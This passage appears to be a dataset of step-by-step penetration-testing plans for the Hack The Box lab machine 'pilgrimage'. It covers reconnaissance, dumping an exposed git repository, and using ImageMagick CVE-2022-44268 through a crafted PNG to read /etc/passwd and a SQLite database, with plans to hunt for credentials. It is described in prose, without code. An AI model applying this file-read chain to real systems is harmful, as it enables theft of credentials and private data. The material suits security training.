  - Exploit Prediction Scoring System (EPSS) Score: 88.664% (high likelihood of exploitability).
  - Exploit Availability: Public exploits are available.

- CVE-2022-44267: Denial of Service (DoS)
  - Description: Can lead to a denial of service when processing a PNG image, causing the `convert` process to indefinitely wait for standard input (stdin).
  - Impact: Can cause the ImageMagick process to hang, leading to resource exhaustion and a denial of service.
  - Technical Details: Public exploits are available, including a specific exploit for PHP platform leading to DoS.

- General Recommendations: Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities.",Try the found exploitations,"1. The intended task of the previous step was to perform a vulnerability analysis on the identified ImageMagick version (7.1.0-49). This task was successfully achieved. The analysis revealed two significant vulnerabilities (CVE-2022-44268 and CVE-2022-44267) and it was found that public exploits are available for these vulnerabilities.

2. These findings are key as they provide potential attack vectors that could be exploited to gain further access to the system or escalate privileges. The fact that public exploits are available simplifies the task of exploiting these vulnerabilities, as it may not be necessary to develop a custom exploit.

3. Given these findings, it is logical to proceed with the strategy of trying the found exploits. This aligns with the overall strategy of identifying and exploiting vulnerabilities in order to achieve the objective of gaining further access to the system. If the exploits are successful, it could provide valuable information or access that could be used in subsequent steps. If the exploits are not successful, it may be necessary to revisit the vulnerability analysis or consider alternative attack vectors.",Exploit the selected exploitations,"1. The previous step was successful in identifying two significant vulnerabilities in the ImageMagick version (7.1.0-49) being used in the system. These vulnerabilities are CVE-2022-44268 and CVE-2022-44267. Furthermore, it was also discovered that public exploits for these vulnerabilities are readily available. This is a significant finding as it presents potential attack vectors that could be exploited to gain unauthorized access or escalate privileges within the system.

2. Given these findings, the logical next step is to try and exploit these vulnerabilities. The availability of public exploits simplifies this process as it may not be necessary to develop a custom exploit. This is a key step in the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. Therefore, the selected step is to exploit the identified vulnerabilities using the available exploits. This step aligns with the overall strategy of exploiting identified vulnerabilities to gain further access to the system. If successful, this could provide critical access or information that could be used in subsequent steps. If unsuccessful, it may be necessary to revisit the vulnerability analysis or consider alternative attack vectors.",{'Metasploit': 'Use public exploits for CVE-2022-44268 and CVE-2022-44267 to attempt exploitation.'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [to-do] {Based on the successful embedding of /etc/passwd file content into the PNG image}",Try the found exploitations,"1. The previous step was successful in identifying two significant vulnerabilities in the ImageMagick version (7.1.0-49) being used in the system. These vulnerabilities are CVE-2022-44268 and CVE-2022-44267. Furthermore, it was also discovered that public exploits for these vulnerabilities are readily available. This is a significant finding as it presents potential attack vectors that could be exploited to gain unauthorized access or escalate privileges within the system.

2. Given these findings, the logical next step is to try and exploit these vulnerabilities. The availability of public exploits simplifies this process as it may not be necessary to develop a custom exploit. This is a key step in the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. Therefore, the selected step is to exploit the identified vulnerabilities using the available exploits. This step aligns with the overall strategy of exploiting identified vulnerabilities to gain further access to the system. If successful, this could provide critical access or information that could be used in subsequent steps. If unsuccessful, it may be necessary to revisit the vulnerability analysis or consider alternative attack vectors.","- The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile.
- Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image.
- A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG.
- The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268.
- The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit.",Convert the hex string into readable bytes,"1. The intended task of the previous step was to exploit the identified vulnerabilities in the 'magick' tool, specifically CVE-2022-44268. This task was successfully achieved. The exploitation involved crafting a malicious PNG file that, when processed by the 'magick' tool, resulted in the embedding of the contents of the /etc/passwd file into the PNG image. The contents of the /etc/passwd file were successfully embedded in the PNG image as a hex-encoded string.

2. The successful exploitation of the vulnerability and subsequent embedding of the /etc/passwd file contents into the PNG image is a significant finding. It confirms the existence and exploitability of the vulnerability and provides a potential method for gaining access to sensitive information on the system. However, the /etc/passwd file contents are currently in a hex-encoded format, which is not easily readable.

3. Given these findings, the logical next step is to convert the hex-encoded string into a format that can be easily read and understood. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. This step may provide valuable information about the system, such as user names, that could be used in subsequent steps. If the conversion is not successful, it may be necessary to revisit the exploitation step or consider alternative methods for obtaining and interpreting the /etc/passwd file contents.",Exploit the selected exploitations,"1. The previous step was successful in exploiting the vulnerability CVE-2022-44268 in the 'magick' tool, which resulted in embedding the contents of the /etc/passwd file into a PNG image. This content was in a hex-encoded format.

2. The finding of the hex-encoded string is significant as it potentially contains sensitive information about the system, such as user names. However, the hex-encoded format is not easily readable, which limits its immediate usefulness.

3. Therefore, the logical next step is to convert the hex string into readable bytes. This step aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. 

4. Converting the hex string into a readable format will allow for a better understanding of the embedded content. This could provide valuable information about the system that can be used in further steps of the penetration testing process.

5. Hence, the selected step is to convert the hex-encoded string into readable bytes. This is a crucial step in the process of exploiting the identified vulnerability. If successful, this could provide critical information for further exploitation of the system.",{'Interactive CLI': 'Convert hex-encoded string into readable bytes'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Plan Next Steps Based on Exploit Output - [to-do] {Based on the retrieved /etc/passwd file content}",Convert the hex string into readable bytes,"1. The previous step was successful in exploiting the vulnerability CVE-2022-44268 in the 'magick' tool, which resulted in embedding the contents of the /etc/passwd file into a PNG image. This content was in a hex-encoded format.

2. The finding of the hex-encoded string is significant as it potentially contains sensitive information about the system, such as user names. However, the hex-encoded format is not easily readable, which limits its immediate usefulness.

3. Therefore, the logical next step is to convert the hex string into readable bytes. This step aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. 

4. Converting the hex string into a readable format will allow for a better understanding of the embedded content. This could provide valuable information about the system that can be used in further steps of the penetration testing process.

5. Hence, the selected step is to convert the hex-encoded string into readable bytes. This is a crucial step in the process of exploiting the identified vulnerability. If successful, this could provide critical information for further exploitation of the system.","- A Python script was used to convert a hex-encoded string back into readable text.
- The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested.
- The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells.
- Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'.",Try to access the database,"1. The intended task of the previous step was to analyze the exploit output, specifically the contents of the /etc/passwd file embedded in the PNG image. This task was successfully achieved. The /etc/passwd file contents were converted from a hex-encoded string into readable text, revealing user account information for the system where the ImageMagick exploit was tested.

2. The successful conversion of the /etc/passwd file contents is a significant finding. It has revealed a list of users present on the system, including 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'. However, this information alone does not provide a means to authenticate or gain further access to the system.

3. Given these findings, the logical next step is to try and access the database. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing the database could provide additional valuable information, such as user passwords or other sensitive data, that could be used in subsequent steps. If access to the database is not successful, it may be necessary to revisit the vulnerability analysis or consider alternative attack vectors. Therefore, the strategy of trying to access the database is chosen.","Further Enumerate the website. - hidden directories, links and software","1. The previous steps were successful in exploiting the identified vulnerability in the 'magick' tool and obtaining the contents of the /etc/passwd file. However, this information alone does not provide a means to authenticate or gain further access to the system.

2. Given the findings so far, it is logical to further enumerate the website in order to find additional valuable information that could be used in subsequent steps. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. In the context of the website, further enumeration could involve searching for hidden directories, links, and software. This could reveal additional attack vectors or sensitive information that could be exploited.

4. A specific area to focus on could be the index.php file of the downloaded source code. This file often contains important configuration information and could potentially reference a SQLite database. Accessing this database could provide additional valuable information, such as user passwords or other sensitive data.

5. Therefore, the selected step is to further enumerate the website, specifically by checking the index.php file of the downloaded source code. This step could potentially lead to the discovery of a SQLite database, which would align with the strategy of trying to access the database.","{'Dirbuster': 'Brute force hidden directories and links on the website.', 'Web page interaction': 'Check the index.php file for configuration information and potential database references.'}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Plan Next Steps Based on Further Enumeration - [to-do] {Based on the located SQLite database}",Try to access the database,"1. The previous steps were successful in exploiting the identified vulnerability in the 'magick' tool and obtaining the contents of the /etc/passwd file. However, this information alone does not provide a means to authenticate or gain further access to the system.

2. Given the findings so far, it is logical to further enumerate the website in order to find additional valuable information that could be used in subsequent steps. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system.

3. In the context of the website, further enumeration could involve searching for hidden directories, links, and software. This could reveal additional attack vectors or sensitive information that could be exploited.

4. A specific area to focus on could be the index.php file of the downloaded source code. This file often contains important configuration information and could potentially reference a SQLite database. Accessing this database could provide additional valuable information, such as user passwords or other sensitive data.

5. Therefore, the selected step is to further enumerate the website, specifically by checking the index.php file of the downloaded source code. This step could potentially lead to the discovery of a SQLite database, which would align with the strategy of trying to access the database.","- The PHP script checks if a user session exists.
- If a session exists, it connects to an SQLite database located at /var/db/pilgrimage.
- It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username.
- If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page.
- If a user session does not exist, it directly redirects to a failure page.
- The location of the SQLite database is /var/db/pilgrimage.",Read the database using the same exploit as previous (CVE-2022-44268),"1. The intended task of the previous step was to further enumerate the website, specifically by checking the index.php file of the downloaded source code. This task was successfully achieved. The PHP script was found to check if a user session exists and if it does, it connects to an SQLite database located at /var/db/pilgrimage.

2. The successful discovery of the SQLite database location is a significant finding. It provides a potential target for further exploitation. However, access to the database is likely restricted, requiring further steps to gain access.

3. Given these findings, the logical next step is to try and read the database. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. The previously exploited vulnerability, CVE-2022-44268, could potentially be used to read the database. This vulnerability allows for the embedding of file contents into a PNG image. If the same vulnerability can be used to read the database, it could provide valuable information, such as user credentials or other sensitive data, that could be used in subsequent steps.

4. Therefore, the selected strategy is to attempt to read the database using the same exploit as previous (CVE-2022-44268). This strategy is chosen based on the successful discovery of the SQLite database location and the potential for the previously exploited vulnerability to be used to read the database.",Exploit the selected exploitations,"1. The previous steps were successful in identifying a vulnerability in the 'magick' tool (CVE-2022-44268) and exploiting it to obtain the contents of the /etc/passwd file. This vulnerability allows for the embedding of file contents into a PNG image.

2. Given the findings so far, it is logical to try and read the database using the same exploit. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing the database could provide additional valuable information, such as user passwords or other sensitive data.

3. In the context of the selected strategy, exploiting the selected vulnerabilities involves using the 'magick' tool to embed the contents of the SQLite database into a PNG image. This could potentially allow for the reading of the database.

4. Once the database has been embedded into a PNG image, the next step would be to convert it back into a readable format. This could be achieved using a similar method to the one used to convert the /etc/passwd file contents from a hex-encoded string into readable text.

5. Therefore, the selected step is to exploit the selected vulnerabilities to read the SQLite database and convert it to a readable format. This step could potentially provide valuable information for further exploitation and aligns with the selected strategy of reading the database using the same exploit as previous (CVE-2022-44268).","{'Metasploit': ""Exploit the CVE-2022-44268 vulnerability using the 'magick' tool to embed the SQLite database contents into a PNG image."", 'Interactive CLI': 'Convert the embedded database from the PNG image back into a readable format.'}"
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
   1.4 Enumerate HTTP service - [completed] {Webpage contains an image shrinker feature, Feroxbuster tool used for directory and file enumeration, Found 46 paths with 0 errors, Significant paths found: http://pilgrimage.htb/.git/, http://pilgrimage.htb/.git/logs/, http://pilgrimage.htb/assets/, http://pilgrimage.htb/assets/css/, http://pilgrimage.htb/assets/images/, http://pilgrimage.htb/assets/js/, http://pilgrimage.htb/tmp/, http://pilgrimage.htb/vendor/, http://pilgrimage.htb/vendor/jquery/}
   1.5 Dump and analyze Git repository - [completed] {Git-dumper tool used to clone Git repository, Full clone of the Git repository has been obtained and is ready for further enumeration, The repository contains the source code of the web application, primarily consisting of PHP files and assets, A binary named 'magick' is present in the files, part of the ImageMagick software suite used for editing and manipulating digital images}
   1.6 Check the version of the 'magick' tool - [completed] {ImageMagick version 7.1.0-49 has two significant vulnerabilities: CVE-2022-44268 and CVE-2022-44267. Both vulnerabilities are related to processing PNG images, Public exploits are available, Users of ImageMagick 7.1.0-49 are strongly advised to upgrade to a patched version to mitigate these vulnerabilities}
   1.7 Plan for Exploitation - [completed] {The vulnerability occurs when parsing PNG files, which may contain embedded references to other files. A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt) with the keyword ""profile"" that ImageMagick interprets as a filename and loads the content as a raw profile. Exploitation path involves crafting a malicious PNG file with a tEXt chunk containing a profile attribute referencing a local file. When ImageMagick is used to process the image, the contents of the referenced files are embedded into the new image. A Proof of Concept (PoC) was tested using a simple Rust application from a GitHub repository. The PoC creates the malicious PNG. The PoC was used to embed the contents of the /etc/passwd file into a PNG image, exploiting CVE-2022-44268. The hex-encoded contents of the /etc/passwd file were successfully embedded inside the PNG as part of the exploit}
   1.8 Analyze the Exploit Output - [completed] {A Python script was used to convert a hex-encoded string back into readable text. The output reveals the contents of the /etc/passwd file from the system where the ImageMagick exploit was tested. The /etc/passwd file contains user account information, including usernames and their respective user and group IDs, home directories, and default shells. Notable users found include 'root', 'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp', 'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', '_apt', 'systemd-network', 'systemd-resolve', 'messagebus', 'timesync', 'emily', 'systemd-coredump', 'sshd', and '_laurel'}
   1.9 Further Enumerate the website - [completed] {The PHP script checks if a user session exists. If a session exists, it connects to an SQLite database located at /var/db/pilgrimage. It prepares an SQL statement to insert into the 'images' table the URL, original file name, and username. If the execution is successful, it redirects to a success page; otherwise, it redirects to a failure page. If a user session does not exist, it directly redirects to a failure page. The location of the SQLite database is /var/db/pilgrimage.}
   1.10 Exploit the selected exploitations - [completed] {The exploit was re-run, this time targeting the /var/db/pilgrimage file. The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script. The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command. The database can now be opened using the sqlite3 command for further exploration.}
   1.11 Plan Next Steps Based on Exploitation Results - [to-do] {Based on the retrieved SQLite database}",Read the database using the same exploit as previous (CVE-2022-44268),"1. The previous steps were successful in identifying a vulnerability in the 'magick' tool (CVE-2022-44268) and exploiting it to obtain the contents of the /etc/passwd file. This vulnerability allows for the embedding of file contents into a PNG image.

2. Given the findings so far, it is logical to try and read the database using the same exploit. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing the database could provide additional valuable information, such as user passwords or other sensitive data.

3. In the context of the selected strategy, exploiting the selected vulnerabilities involves using the 'magick' tool to embed the contents of the SQLite database into a PNG image. This could potentially allow for the reading of the database.

4. Once the database has been embedded into a PNG image, the next step would be to convert it back into a readable format. This could be achieved using a similar method to the one used to convert the /etc/passwd file contents from a hex-encoded string into readable text.

5. Therefore, the selected step is to exploit the selected vulnerabilities to read the SQLite database and convert it to a readable format. This step could potentially provide valuable information for further exploitation and aligns with the selected strategy of reading the database using the same exploit as previous (CVE-2022-44268).","- The exploit was re-run, this time targeting the /var/db/pilgrimage file.
- The same procedure was followed, trimming the \n characters and converting the file to bytes. The bytes were then saved into a file using a Python script.
- The saved file, named 'sql.db', was confirmed to be an SQLite 3.x database using the 'file' command.
- The database can now be opened using the sqlite3 command for further exploration.",Enumerate the tables and try to find credentials,"1. The intended task of the previous step was to exploit the selected vulnerabilities to read the SQLite database and convert it to a readable format. This task was successfully achieved. The exploit was re-run, this time targeting the /var/db/pilgrimage file, and the SQLite database was successfully saved into a file named 'sql.db'.

2. The successful retrieval of the SQLite database is a significant finding. It provides a potential source of valuable information, such as user credentials. However, the contents of the database are not yet known, requiring further steps to enumerate its contents.

3. Given these findings, the logical next step is to enumerate the tables in the database and try to find credentials. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing user credentials could potentially provide a means to authenticate and gain further access to the system.

4. Therefore, the selected strategy is to enumerate the tables in the database and try to find credentials. This strategy is chosen based on the successful retrieval of the SQLite database and the potential for the database to contain user credentials.","Explore the suspicious files, commands and create a summary of the findings.","1. The previous steps were successful in exploiting a vulnerability to read the SQLite database and convert it into a readable format. This database was located in the /var/db/pilgrimage file and could potentially contain valuable information.

2. Given the findings so far, it is logical to explore the database further. This aligns with the overall strategy of identifying and exploiting vulnerabilities to gain further access to the system. Accessing the database could provide additional valuable information such as user credentials or other sensitive data.

3. In the context of the selected strategy, exploring suspicious files, commands, and creating a summary of the findings involves enumerating the tables in the database and trying to find credentials. This could potentially allow for the identification of user credentials, which could be used to gain further access to the system.

4. Once the enumeration is complete, the findings should be summarized. This summary could include the names of the tables in the database, any identified credentials, and any other significant findings. This summary will provide a clear overview of the findings from the database and can be used to plan the next steps.

5. Therefore, the selected step is to explore the suspicious files, commands and create a summary of the findings by enumerating the database to find credentials. This step could potentially provide valuable information for further exploitation and aligns with the selected strategy of enumerating the tables and trying to find credentials.",{'SQLmap': 'Enumerate the SQLite database at /var/db/pilgrimage to find credentials and other sensitive data.'}
pilgrimage,"1. Reconnaissance - [completed] {Target IP:10.129.237.31}
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - [completed]
       1.3.1 Perform a port scan - [completed] {Host Status: Up, Latency: 0.95s, Closed TCP Ports: 998, Open Ports: 22, 80}
       1.3.2 Determine the services and versions on each open port - [completed] {Port 22: Open, Service: SSH, Version: OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0), SSH-Hostkey: RSA: 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3, ECDSA: 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af, ED25519: 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04, Port 80: Open, Service: HTTP, Version: nginx 1.18.0, HTTP Title: Did not follow redirect to http://pilgrimage.htb/, HTTP Server Header: nginx/1.18.0, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}
